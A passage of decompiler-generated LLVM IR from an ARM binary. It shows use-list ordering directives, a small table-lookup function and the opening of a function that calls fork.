  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v1_9f1c, { 1, 2, 0 }
  uselistorder i32 %v5_9f18, { 7, 6, 1, 4, 5, 3, 2, 8, 0, 10, 9, 11 }
  uselistorder i32 %v2_9f00, { 1, 0, 2 }
  uselistorder i32 %v2_9efc, { 1, 0, 2 }
  uselistorder i32 %v0_9ee0, { 0, 2, 1 }
  uselistorder i32 %v4_9ed8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_9eb4, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i32 %v1_9ea8, { 1, 2, 0 }
  uselistorder i32 %v4_9ea0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9e3c, { 1, 2, 0 }
  uselistorder i32 %v5_9e38, { 1, 2, 8, 3, 6, 7, 5, 4, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9e20.v4_9e00, { 1, 0, 2 }
  uselistorder i32 %v1_9dd0, { 1, 2, 0 }
  uselistorder i32 %v4_9dcc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9d54, { 1, 2, 0 }
  uselistorder i32 %v5_9d50, { 1, 2, 8, 3, 6, 7, 5, 4, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9d38.v4_9d18, { 1, 0, 2 }
  uselistorder i32 %v1_9cf4, { 1, 2, 0 }
  uselistorder i32 %v4_9cec, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9c6c, { 1, 2, 0 }
  uselistorder i32 %v5_9c68, { 1, 8, 7, 2, 5, 6, 4, 3, 9, 0, 11, 10, 12 }
  uselistorder i32 %v2_9c50.v4_9c30, { 1, 0, 2 }
  uselistorder i32 %v1_9c10, { 1, 2, 0 }
  uselistorder i32 %v4_9c0c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9be4, { 1, 2, 0 }
  uselistorder i32 %v4_9be0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9bbc, { 1, 2, 0 }
  uselistorder i32 %v4_9bb8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_a66c, { 3, 7, 0, 4, 5, 6, 1, 2 }
  uselistorder i32 %v1_9b70, { 1, 2, 0 }
  uselistorder i32 %v5_9b6c, { 0, 2, 1, 3 }
  uselistorder i32 %v4_9b48, { 2, 1, 0, 3, 4, 5, 6 }
  uselistorder i32 %v3_9ad0, { 0, 2, 1 }
  uselistorder i32 %v2_9ac4, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_9ab8, { 1, 0 }
  uselistorder i32 %v2_9aac, { 1, 0 }
  uselistorder i32 %v0_9aac, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_9aa4, { 1, 0 }
  uselistorder i32 %v1_9aac, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_9a88, { 1, 0, 2 }
  uselistorder i32 %v1_9a80, { 1, 0 }
  uselistorder i32 %v2_9a68, { 1, 0 }
  uselistorder i32 %v0_9a68, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_9a44, { 4, 2, 5, 3, 1, 0, 6 }
  uselistorder i32 %v2_99ac, { 1, 0 }
  uselistorder i32 %v1_99a8, { 2, 1, 4, 0, 5, 3, 6 }
  uselistorder i32 %v3_99a4, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32 %v2_984c, { 1, 0 }
  uselistorder i32 %v1_984c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_95d8, { 2, 1, 0 }
  uselistorder i32 %v3_95d4, { 1, 0 }
  uselistorder i32 %v1_95b4, { 1, 2, 0 }
  uselistorder i32 %v3_95b0, { 4, 1, 0, 2, 6, 5, 7, 3 }
  uselistorder i32 %v2_95a0, { 1, 0 }
  uselistorder i32 %v1_9598, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i1 %v7_9588, { 1, 0 }
  uselistorder i1 %v7_9580, { 1, 0 }
  uselistorder i32 %v1_9564, { 2, 1, 0 }
  uselistorder i32 %v3_9560, { 1, 0 }
  uselistorder i32 %v0_9564, { 1, 0 }
  uselistorder i32 %v2_9534, { 1, 0 }
  uselistorder i32 %v1_9534, { 1, 2, 4, 0, 3, 5 }
  uselistorder i32 %v0_9534, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_9530, { 0, 2, 1, 3 }
  uselistorder i32 %v0_951c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_94dc, { 1, 0 }
  uselistorder i32 %v2_94d4, { 1, 0 }
  uselistorder i32 %v1_94c8, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v2_94b4, { 1, 0 }
  uselistorder i32 %v0_94b4, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_94ac, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_94b4, { 3, 1, 4, 2, 0 }
  uselistorder i32 %v3_949c, { 1, 0 }
  uselistorder i32 %v3_9490, { 1, 0, 2 }
  uselistorder i32 %v0_944c, { 1, 0, 2 }
  uselistorder i32 %v1_93f0, { 1, 2, 0 }
  uselistorder i32 %v3_93ec, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_93c8, { 1, 2, 0 }
  uselistorder i32 %v3_93bc, { 0, 2, 1, 3 }
  uselistorder i32 %v4_93a8, { 1, 0 }
  uselistorder i8 %v3_93a8, { 16, 17, 18, 19, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_93a8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_9658, { 3, 4, 5, 1, 2, 0, 8, 7, 6 }
  uselistorder i32 %v2_9398, { 1, 0 }
  uselistorder i32 %v1_938c, { 2, 0, 3, 1, 4 }
  uselistorder i1 %v7_9368, { 1, 0 }
  uselistorder i32 %v1_9368, { 1, 0 }
  uselistorder i1 %v7_9360, { 1, 0 }
  uselistorder i32 %v4_9344, { 1, 0, 2 }
  uselistorder i1 %v7_9340, { 1, 0 }
  uselistorder i32 %v4_9324, { 1, 0, 2 }
  uselistorder i1 %v7_9320, { 1, 0 }
  uselistorder i1 %v7_9318, { 1, 0 }
  uselistorder i1 %v7_9310, { 1, 0 }
  uselistorder i32 %v2_9334, { 1, 0, 2, 3 }
  uselistorder i32 %v3_92ec248, { 1, 0 }
  uselistorder i32 %v5_92e8, { 1, 0 }
  uselistorder i8* %v1_9698, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_94a0, { 0, 21, 1, 20, 2, 23, 3, 22, 25, 4, 24, 5, 27, 6, 26, 7, 29, 8, 28, 9, 31, 10, 30, 11, 19, 34, 12, 33, 13, 35, 14, 17, 15, 18, 16, 36, 32 }
  uselistorder i32 %v2_9428, { 1, 0 }
  uselistorder i32 %v3_ac10, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-20856.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 3, 68, 67, 4, 66, 65, 5, 63, 62, 6, 79, 78, 7, 77, 8, 76, 75, 9, 74, 73, 10, 72, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 17, 45, 44, 18, 43, 42, 19, 41, 40, 20, 39, 38, 21, 37, 22, 36, 35, 23, 34, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20872.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-20860.0.ph, { 1, 0 }
  uselistorder i32 %v1_9258, { 1, 0 }
  uselistorder i32 %v0_9258, { 1, 0 }
  uselistorder i32 %v2_9218, { 1, 0 }
  uselistorder i32 %v8_91fc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_91dc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_9164, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_9108, { 2, 1, 4, 3, 0, 5, 6 }
  uselistorder i32 %v0_90f4, { 14, 0, 1, 15, 13, 28, 24, 2, 25, 23, 26, 11, 3, 4, 12, 10, 27, 8, 5, 6, 9, 7, 22, 21, 29, 18, 19, 20, 17, 16 }
  uselistorder i32 %v0_90e8, { 1, 2, 6, 0, 3, 4, 5 }
  uselistorder i1 %v2_9078, { 1, 0, 2 }
  uselistorder i32 %v1_9074, { 0, 2, 1, 3 }
  uselistorder i32 %v2_9064, { 1, 0 }
  uselistorder i32 %v3_9060, { 0, 2, 4, 1, 5, 3, 6 }
  uselistorder i32 %v2_9058, { 2, 4, 0, 1, 5, 3, 6 }
  uselistorder i32* %v11_904c, { 1, 0, 2 }
  uselistorder i32 %v10_9048, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 34, 33, 32, 30, 29, 28, 31, 27, 26, 25, 12, 23, 22, 9, 8, 24, 7, 39, 38, 37, 36, 35, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_9040, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9030, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v2_9020, { 2, 3, 0, 6, 5, 4, 7, 1 }
  uselistorder i32 %v1_9000, { 1, 0 }
  uselistorder i32 %v0_8ffc, { 1, 0, 3, 2 }
  uselistorder i8* %tmp199, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9, 10, 11 }
  uselistorder i32 %v2_8fd8, { 0, 17, 23, 24, 25, 26, 1, 20, 2, 21, 22, 27, 10, 11, 3, 16, 4, 18, 19, 28, 5, 15, 6, 29, 7, 14, 30, 8, 13, 31, 9, 12, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 %v5_8fd0, { 1, 0 }
  uselistorder i32 %v6_8f58, { 5, 4, 6, 2, 11, 0, 1, 10, 12, 9, 3, 8, 7, 13 }
  uselistorder i32 %v1_8f3c, { 1, 0 }
  uselistorder i32 %v1_8f30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 0, 36, 37, 38, 39, 40, 43, 41, 42 }
  uselistorder i32* %sb.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 13, 14, 17, 18, 16, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 6, 5, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 11, 7, 8, 9, 10, 12, 13, 14, 15, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 46, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 123, 124, 125, 127, 126, 128, 129, 63, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 115, 112, 113, 114, 116, 117, 120, 121, 118, 119, 122, 131, 130, 132, 133, 134, 135, 136, 141, 137, 138, 139, 140, 142, 144, 143, 3, 146, 145, 2, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 89, 90, 91, 37, 38, 40, 39, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 88, 85, 86, 118, 119, 92, 93, 94, 95, 96, 97, 98, 100, 99, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 1, 2, 151, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 3, 41, 42, 43, 44, 47, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 135, 136, 137, 138, 139, 140, 141, 59, 60, 61, 64, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 130, 129, 131, 132, 134, 133, 170, 171, 142, 143, 144, 145, 146, 147, 148, 149, 150, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 169, 168, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 10, 11, 272, 13, 15, 14, 16, 18, 17, 20, 19, 22, 21, 23, 25, 24, 26, 29, 27, 28, 31, 30, 34, 32, 33, 36, 35, 37, 38, 40, 39, 41, 42, 43, 45, 44, 46, 48, 47, 50, 49, 51, 53, 52, 55, 54, 56, 58, 57, 60, 59, 61, 63, 62, 64, 67, 65, 66, 69, 68, 72, 70, 71, 74, 73, 76, 75, 78, 77, 80, 79, 81, 83, 82, 85, 84, 87, 86, 88, 89, 91, 90, 93, 92, 95, 94, 96, 98, 97, 99, 100, 101, 103, 102, 105, 104, 106, 108, 107, 109, 111, 110, 113, 112, 114, 115, 118, 116, 117, 119, 121, 120, 122, 124, 123, 126, 125, 127, 129, 128, 131, 130, 273, 271, 274, 276, 275, 7, 277, 133, 132, 134, 136, 135, 137, 138, 140, 139, 2, 141, 143, 142, 145, 144, 147, 146, 150, 148, 149, 152, 151, 153, 155, 154, 156, 5, 157, 159, 158, 161, 160, 162, 164, 163, 165, 167, 166, 168, 169, 171, 170, 173, 172, 174, 176, 175, 177, 179, 178, 180, 181, 183, 182, 185, 184, 186, 188, 187, 189, 191, 190, 192, 4, 193, 194, 195, 197, 196, 199, 198, 205, 200, 201, 292, 202, 203, 204, 207, 206, 208, 3, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 263, 262, 264, 265, 266, 267, 269, 268, 270, 278, 279, 281, 280, 283, 282, 285, 284, 288, 289, 287, 286, 297, 290, 291, 293, 295, 294, 296, 299, 298, 300, 6, 301, 303, 302, 304, 9, 1, 306, 305, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 320, 319, 322, 321, 324, 323, 8, 325, 327, 326, 328, 329, 330, 331, 332, 333, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 32, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 43, 44, 45, 34, 35, 36, 37, 38, 39, 0, 40, 41, 42 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 39, 40, 41, 42, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 56, 43, 44, 45, 46, 47, 48, 0, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 27, 26, 4, 5, 6, 7, 28, 29, 24, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 3, 25, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 137, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 63, 56, 57, 58, 59, 60, 61, 62, 118, 119, 120, 121, 122, 123, 124, 64, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 106, 105, 107, 108, 109, 114, 116, 115, 110, 111, 112, 113, 117, 150, 151, 152, 125, 126, 134, 135, 127, 128, 129, 130, 131, 132, 133, 136, 0, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149 }
  uselistorder i1* %cpsr_v.global-to-local, { 1, 131, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 112, 113, 114, 115, 116, 117, 118, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 110, 109, 106, 107, 108, 111, 143, 144, 145, 119, 120, 128, 129, 121, 122, 123, 124, 125, 126, 127, 130, 0, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142 }
  uselistorder i1* %cpsr_n.global-to-local, { 1, 134, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 62, 56, 57, 58, 59, 60, 61, 115, 116, 117, 118, 119, 120, 121, 63, 64, 65, 67, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 113, 112, 107, 108, 109, 110, 114, 146, 147, 148, 122, 123, 131, 132, 124, 125, 126, 127, 128, 129, 130, 133, 0, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 144, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 65, 59, 60, 61, 62, 63, 64, 121, 122, 123, 124, 125, 126, 127, 66, 67, 68, 69, 71, 72, 70, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 117, 119, 118, 113, 114, 115, 116, 120, 162, 163, 164, 128, 129, 130, 140, 141, 131, 132, 133, 134, 135, 136, 137, 138, 139, 142, 143, 0, 147, 145, 146, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161 }
  uselistorder i32 ptrtoint (i32* @global_var_14fa8.105 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14f98.100 to i32), { 0, 2, 1, 3 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14f90.98 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_14f8c.96 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_14f84.94 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_14f64.82 to i32), { 0, 2, 1, 3 }
  uselistorder i32 20556, { 1, 0 }
  uselistorder i32 20684, { 2, 0, 1 }
  uselistorder i32 -20773, { 0, 4, 11, 5, 1, 7, 6, 2, 8, 3, 9, 10 }
  uselistorder i32 1464, { 1, 0 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 5, 2, 0, 1, 3, 4, 6, 7 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 5, 6, 7, 2, 8 }
  uselistorder i32 36, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_14f6c.76 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_aa74, { 1, 0 }
  uselistorder label %.thread72, { 1, 0 }
  uselistorder label %dec_label_pc_aa48, { 2, 0, 1 }
  uselistorder label %.thread69, { 1, 0 }
  uselistorder label %dec_label_pc_a88c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a76c, { 1, 0 }
  uselistorder label %.thread66, { 1, 0 }
  uselistorder label %dec_label_pc_a740, { 2, 0, 1 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_a5dc, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_a590, { 1, 0 }
  uselistorder label %dec_label_pc_a568, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a55c, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %dec_label_pc_a3d0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a344, { 1, 0 }
  uselistorder label %dec_label_pc_a218, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_a1f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a188, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a158, { 7, 2, 3, 1, 8, 4, 5, 0, 6 }
  uselistorder label %bb230, { 1, 0 }
  uselistorder label %dec_label_pc_9fdc, { 1, 0 }
  uselistorder label %dec_label_pc_9fd4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9fac, { 1, 0 }
  uselistorder label %dec_label_pc_9f6c, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %bb224, { 1, 0 }
  uselistorder label %bb222, { 1, 0 }
  uselistorder label %dec_label_pc_9e7c, { 2, 1, 0 }
  uselistorder label %bb220, { 1, 0 }
  uselistorder label %.thread48, { 3, 0, 1, 2 }
  uselistorder label %bb217, { 1, 0 }
  uselistorder label %.thread47, { 3, 0, 1, 2 }
  uselistorder label %bb214, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_9b78, { 1, 0 }
  uselistorder label %dec_label_pc_9aa0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9a24, { 1, 0 }
  uselistorder label %dec_label_pc_9a0c, { 1, 0 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
  uselistorder label %dec_label_pc_995c, { 1, 0 }
  uselistorder label %dec_label_pc_9924, { 1, 0 }
  uselistorder label %dec_label_pc_9664, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9634, { 1, 0 }
  uselistorder label %dec_label_pc_9590, { 7, 8, 2, 9, 1, 10, 3, 11, 12, 13, 0, 15, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_9388, { 4, 1, 0, 2, 3, 5 }
  uselistorder label %dec_label_pc_92b4.dec_label_pc_92b4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9294.dec_label_pc_9294_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_9280, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_9280.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_919c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9054, { 1, 0 }
  uselistorder label %dec_label_pc_9010, { 1, 3, 4, 0, 2 }
}

define i32 @function_acdc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_acdc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_acdc = urem i32 %arg1, 256
  %v2_ace0 = icmp eq i32 %v1_acdc, 0
  %v1_ace8 = urem i32 %arg3, 256
  br i1 %v2_ace0, label %dec_label_pc_ad2c, label %dec_label_pc_acf4

dec_label_pc_acf4:                                ; preds = %dec_label_pc_acdc
  %v0_acf4 = load i32, i32* %r1.global-to-local, align 4
  %v1_acf4 = add i32 %v0_acf4, 4
  %v2_acf4 = inttoptr i32 %v1_acf4 to i8*
  %v3_acf4 = load i8, i8* %v2_acf4, align 1
  %v4_acf4 = zext i8 %v3_acf4 to i32
  %v9_acf8 = icmp eq i32 %v4_acf4, %v1_ace8
  br i1 %v9_acf8, label %dec_label_pc_ad34, label %dec_label_pc_ad1c.preheader

dec_label_pc_ad1c.preheader:                      ; preds = %dec_label_pc_acf4
  br label %dec_label_pc_ad1c

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad1c
  %v1_ad0c = add i32 %v0_ad14.in, 12
  %v2_ad0c = inttoptr i32 %v1_ad0c to i8*
  %v3_ad0c = load i8, i8* %v2_ad0c, align 1
  %v4_ad0c = zext i8 %v3_ad0c to i32
  %v9_ad10 = icmp eq i32 %v4_ad0c, %v1_ace8
  br i1 %v9_ad10, label %dec_label_pc_ad34, label %dec_label_pc_ad1c

dec_label_pc_ad1c:                                ; preds = %dec_label_pc_ad1c.preheader, %dec_label_pc_ad0c
  %v0_ad14.in = phi i32 [ %v0_acf4, %dec_label_pc_ad1c.preheader ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v0_ad1c = phi i32 [ 0, %dec_label_pc_ad1c.preheader ], [ %v1_ad1c, %dec_label_pc_ad0c ]
  %v0_ad14 = add i32 %v0_ad14.in, 8
  %v1_ad1c = add i32 %v0_ad1c, 1
  store i32 %v1_ad1c, i32* @lr, align 4
  %v9_ad20 = icmp eq i32 %v1_ad1c, %v1_acdc
  store i32 %v0_ad14, i32* %r1.global-to-local, align 4
  br i1 %v9_ad20, label %dec_label_pc_ad2c, label %dec_label_pc_ad0c

dec_label_pc_ad2c:                                ; preds = %dec_label_pc_ad1c, %dec_label_pc_acdc
  ret i32 %arg4

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad0c, %dec_label_pc_acf4
  %v0_ad34 = phi i32 [ %v0_acf4, %dec_label_pc_acf4 ], [ %v0_ad14, %dec_label_pc_ad0c ]
  %v1_ad34 = inttoptr i32 %v0_ad34 to i32*
  %v2_ad34 = load i32, i32* %v1_ad34, align 4
  ret i32 %v2_ad34

; uselistorder directives
  uselistorder i32 %v1_ad1c, { 1, 2, 0 }
  uselistorder i32 %v0_ad14, { 1, 0, 2 }
  uselistorder i32 %v0_ad14.in, { 1, 0 }
  uselistorder i32 %v0_acf4, { 1, 0, 2 }
  uselistorder i32 %v1_ace8, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
}

define i32 @function_ad40(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_ad40:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_ad40 = load i32, i32* @r4, align 4
  store i32 %v3_ad40, i32* %stack_var_-32, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v1_ad4c = urem i32 %arg2, 256
  store i32 %v1_ad4c, i32* %r7.global-to-local, align 4
  %v0_ad58 = call i32 @_fork()
  %v7_ad5c = icmp eq i32 %v0_ad58, -1
